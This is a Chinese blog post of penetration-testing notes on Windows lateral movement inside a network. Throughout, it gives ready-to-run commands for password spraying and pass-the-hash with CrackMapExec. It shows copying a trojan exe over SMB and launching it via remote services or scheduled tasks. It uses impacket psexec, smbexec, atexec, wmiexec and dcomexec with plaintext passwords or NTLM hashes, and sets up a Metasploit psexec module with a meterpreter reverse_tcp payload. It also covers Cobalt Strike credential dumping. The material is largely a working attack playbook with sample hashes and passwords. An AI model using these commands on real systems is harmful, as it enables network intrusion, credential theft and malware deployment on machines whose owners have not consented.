---
title: "横向移动技术"
permalink: lateral-movement/
date: 2026-01-30 01:32:31
categories:
  - 网络安全
  - 内网渗透
tags:
  - 横向移动
  - IPC$
  - 内网渗透
img: /medias/featureimages/13.jpg
summary: "IPC$、WMI、SMB、PsExec、WinRM 等横向移动手法的条件、命令与踩坑记录。"
---

<!-- more -->

对同一网段的机器的渗透测试

+ 内网存活探测
+ 找漏洞 ，一般情况下内网中的网站服务、其他服务、设备 弱口令、历史漏洞非常多，可以用
弱口令或历史漏洞作为突破点攻击其他机器
+ ⭐️ 基于windows 明文密码的横向移动 和 基于 windows ntlm hash 的横向移动 （pth pass
hash 哈希传递攻击）

## windows 横向移动
基于windows 明文密码的横向移动 和 基于 windows ntlm hash 的横向移动 （pth pass hash 哈 希传递攻击）

## 获取密码或 NTLM hash
前提：已经获取到 windows 7 操作系统工作组管理员的权限

读取 hash 和 明文密码

administrator 用户 NTLM hash  ：

`afffeba176210fad4628f0524bfe1942`

administrator 用户 明文密码  ：

`123.com`

### 密码喷洒
 使用已获取的密码，对局域网中其他主机进行登录，看是否有主机与自己密码一致

 工具  ： https://github.com/byt3bl33d3r/CrackMapExec

 安装   ：`apt install crackmapexec  `

####  使用
#####  明文密码喷洒
`crackmapexec smb 192.168.79.0/24 -u administrator -p "123.com" --local-auth`

####  哈希传递攻击
`crackmapexec smb 192.168.79.0/24 -u administrator -H afffeba176210fad4628f0524bfe1942  --local-auth`

**windows 操作系统网络认证的过程中，明文密码 和 NTLM hash 看起来是等价的，为什么？ （哈希传递攻击的原理、 pth、 pass the hashes）**

##  1️⃣ 远程创建服务
**端口 445**

**windows 可以通过 administrator 用户连接到其他主机，为其他主机创建服务**

### 手动操作
**1  先通过文件共享，传入木马 exe 文件 （该exe文件，必须是 service exe 文件）**

`net use \\目标ip /user:administrator 密码`

`**copy 木马.exe \\目标ip\c$\windows\temp\木马.exe  **`

**2  通过远程创建服务功能，在windows7 上为 远程机器 （windows server 2008）创建服务，并 启动服务**

 `**sc \\目标ip create 服务名 binPath= "远程机器木马exe的路径" password= 密码**`

`** sc \\目标ip start 服务名**  `

###  工具 psexec
 https://github.com/fortra/impacket

 https://github.com/maaaaz/impacket-examples-windows

 `psexec.exe administrator:"密码"@目标ip地址`

`psexec.exe administrator:"123.com"@192.168.79.95`

 打开新的 cmd 是目标ip地址的 cmd ，可以直接执行系统命令

 原理： 启动时，上传木马，创建服务，启动服务

 退出时，停止服务，删除服务，删除木马

###  工具 psexec PTH
`** psexec.exe administrator@目标ip地址 -hashes 0:NTLMhash  **`

`psexec.exe administrator@192.168.79.95 -hashes 0:afffeba176210fad4628f0524bfe1942`

###  工具 msf psexec 模块
 `use exploit/windows/smb/psexec  `

```plain
msf exploit(windows/smb/psexec) > set rhost 192.168.79.95
rhost => 192.168.79.95
msf exploit(windows/smb/psexec) > set smbpass afffeba176210fad4628f0524bfe1942:afffeba176210fad4628f0524bfe1942
smbpass => afffeba176210fad4628f0524bfe1942:afffeba176210fad4628f0524bfe1942
msf exploit(windows/smb/psexec) > set smbuser administrator
smbuser => administrator
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > set lport 56123
lport => 56123
```

**smbpass可以是明文密码，也可以是哈希**

`**哈希的格式必须是32位字符：NTLMhash**`

###  工具 cobaltstrike psexec 横向
#### 1  上线 windows 7 beacon 并读取 ntlm hash 和明文密码
 `**hashdump  **`

`**logonpasswords  **`

#### 2  使用 cobaltstrike 进行内网存活探测

#### 3  选择目标进行横向移动

#### 4  得到windows server 2008 的beacon

#### 正向连接内网
```plain
上线 windows 7 beacon 并读取 ntlm hash 和明文密码
使用 cobaltstrike 进行内网存活探测
创建一个正向监听器
```

4  进行横向移动

###  工具 smbexec
`smbexec.exe administrator:"密码"@目标ip地址`

`smbexec.exe administrator@目标ip地址 -hashes 0:NTLMhash  `

###  psexec 和 smbexec 有什么区别
+  **psexec 会上传一个 exe 木马文件**
+ **smbexec 不会上传木马文件**

**1 smbexec 登录后不会创建服务，只运行命令时，如 whoami 命令时，smbexec 会创建一个服务 ，服务名随机，服务的内容为 cmd.exe /c whoami > \\127.0.0.1\c$\_output**

**2 smbexec 通过文件共享服务，读取 \\127.0.0.1\c$\_output 里保存的命令执行结果**

**3  smbexec 删除服务，和命令执行结果**

+ smbexec优点：没有exe文件落地
+ smbexec缺点：会留下大量的创建服务、删除服务的日志

##  2️⃣远程创建计划任务
端口 445 135（RPC）

###  手动操作
#### 1  先通过文件共享，传入木马 exe 文件
`**net  use  \\192.168.79.95  /user:administrator  123.com**`

`**net  use**`

`**copy  79.exe  \\192.168.79.95\c$\79.exe**`

#### 2  远程创建计划任务
 在windows 7 操作，给 windows server 2008 创建计划任务

` schtasks /create /s 192.168.79.95 /u administrator /p "123.com" /tn hana /tr "C:\\79.exe" /sc minute /mo 1`

 等一分钟左右，windows server 2008 即可触发计划任务，执行木马

###  工具 atexec
 如果执行失败，就重复尝试

`**atexec.exe administrator:"密码"@目标ip地址 "具体的系统命令" **`

`**atexec.exe administrator@目标ip地址 "具体的系统命令" -hashes 0:NTLMhash** `

####  原理：
 创建计划任务、执行计划任务、删除计划任务、通过文件共享读取命令执行结果

## 3️⃣wmi 横向
 端口：135（rpc） 445（可选 ，如果wmi无回显，就不会用到 445）

wmi ： windows 管理规范，wmic 是控制 wmi 的工具，可以实现对本地、远程计算机的硬件配 置、系统组件配置

 wmic 是windows 自带的工具，无需上传任何文件，wmi 在高版本中支持流量加密

### 手动操作
 `wmic /node:目标IP /user:administrator /password:"密码" process list brief  `

 无回显

`wmic /node:目标IP /user:administrator /password:"密码" process call create "cmd.exe /c 命令"  `

 有回显

 先把命令执行结果导出到文件中，再通过 445 （smb）读取命令执行结果

`wmic /node:目标IP /user:administrator /password:"密码" process call create "cmd.exe /c 命令>C:\1.txt"  `

`type \\目标ip\c$\1.txt  `

###  工具 wmiexec
 `wmiexec.exe administrator:"密码"@目标ip地址 `

`wmiexec.exe administrator@目标ip地址 -hashes 0:NTLMhash  `

 wmiexec 也支持只用135端口的无回显命令执行

 `**wmiexec.exe administrator:"密码"@目标ip地址 "系统命令" -nooutput **`

`**wmiexec.exe administrator@目标ip地址 "系统命令" -hashes 0:NTLMhash -nooutput  **`

## 4️⃣  dcom 横向
 dcom: 分布式组件对象模型，默认端口 135，和大随机端口 （49000+）

 哪些dcom对象可以执行命令  ：

+  ShellWindows
+  ShellBrowserWindow
+ MMC20

 优点：dcom 只会使用 135 端口 、 高版本的 dcom 支持加密

###  工具 dcomexec
 `dcomexec.exe administrator:"密码"@目标ip地址 -object MMC20`

`dcomexec.exe administrator@目标ip地址 -hashes 0:NTLMhash -object MMC20  `

###  工具 mmcexec
 等价于 dcomexec 指定 -object MMC20 选项

` mmcexec.exe administrator:"密码"@目标ip地址`

 `mmcexec.exe administrator@目标ip地址 -hashes 0:NTLMhash  `

## 5️⃣ 其他方法
+  telnet 横向移动 ：端口 23 （windows 默认没有开启 telnet）
+ rdp 横向移动：端口 3389 （windows 默认没有开启 rdp）
+ winRM / winRS 横向移动 ： 端口 5985 / 5986 （windows 默认没有开启 winRM 服务）

###  windows 域横向移动
 域管理员默认可以登录到域中所有机器

```plain
psexec.exe 域名/administrator:"密码"@目标IP地址
psexec.exe baidu.com/administrator:"1qaz@WSX"@192.168.79.95
psexec.exe baidu.com/administrator:"1qaz@WSX"@192.168.79.85
```

域环境中，只要是域管用户，默认均可以横向 （名字不是administrator 也可以）

⚠️ 工作组横向，用户必须是 administrator
